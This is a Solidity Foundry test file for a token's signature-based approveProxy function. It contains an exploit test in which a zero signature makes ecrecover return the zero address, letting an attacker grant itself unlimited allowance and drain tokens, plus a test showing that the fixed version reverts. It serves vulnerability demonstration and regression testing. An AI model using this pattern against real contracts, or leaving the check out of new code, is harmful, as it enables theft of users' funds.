// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/A13/ApproveProxyKeccak.sol";
import "../src/A13/ApproveProxyKeccakFixed.sol";

contract ApproveProxyKeccakTest is Test {
    ApproveProxyKeccak internal vulnerableToken;
    ApproveProxyKeccakFixed internal fixedToken;

    uint256 internal constant INITIAL_SUPPLY = 1_000_000 ether;
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        vulnerableToken = new ApproveProxyKeccak();
        // Mint the initial supply to the zero address to create a target.
        vulnerableToken.mint(address(0), INITIAL_SUPPLY);
    }

    // --- VULNERABILITY TEST ---

    function test_Exploit_ApproveAndDrainFromZeroAddress() public {
        // --- Part 1: Gain Allowance via Exploit ---

        // Arrange: Attacker prepares malicious arguments.
        address from = address(0);
        address spender = attacker;
        uint256 valueToApprove = type(uint256).max; // Approve unlimited amount

        // Invalid signature that will cause ecrecover to return address(0).
        uint8 v = 0;
        bytes32 r = bytes32(0);
        bytes32 s = bytes32(0);

        // Act: Attacker calls approveProxy with malicious arguments.
        vm.prank(attacker);
        vulnerableToken.approveProxy(from, spender, valueToApprove, v, r, s);

        // Assert: Attacker now has an unlimited allowance from address(0).
        assertEq(
            vulnerableToken.allowance(from, spender),
            valueToApprove,
            "Attacker should have unlimited allowance"
        );

        // --- Part 2: Drain Funds using Allowance ---

        // Arrange: Define an amount to steal.
        uint256 amountToSteal = 100_000 ether;
        assertEq(vulnerableToken.balances(attacker), 0);

        // Act: Attacker calls transferFrom to steal the funds.
        vm.prank(attacker);
        vulnerableToken.transferFrom(from, attacker, amountToSteal);

        // Assert: Check that funds were successfully stolen.
        assertEq(vulnerableToken.balances(attacker), amountToSteal);
        assertEq(
            vulnerableToken.balances(address(0)),
            INITIAL_SUPPLY - amountToSteal
        );
    }

    // --- MITIGATION TEST ---

    function test_Mitigation_CannotApproveFromZeroAddress() public {
        // Arrange: Deploy the fixed contract and prepare malicious arguments.
        fixedToken = new ApproveProxyKeccakFixed();

        address from = address(0);
        address spender = attacker;
        uint256 valueToApprove = type(uint256).max;
        uint8 v = 0;
        bytes32 r = bytes32(0);
        bytes32 s = bytes32(0);

        // Act & Assert: The call should now revert due to the explicit check.
        vm.prank(attacker);
        vm.expectRevert("From address cannot be zero");
        fixedToken.approveProxy(from, spender, valueToApprove, v, r, s);

        // Sanity check: ensure allowance remains zero.
        assertEq(fixedToken.allowance(from, spender), 0);
    }
}
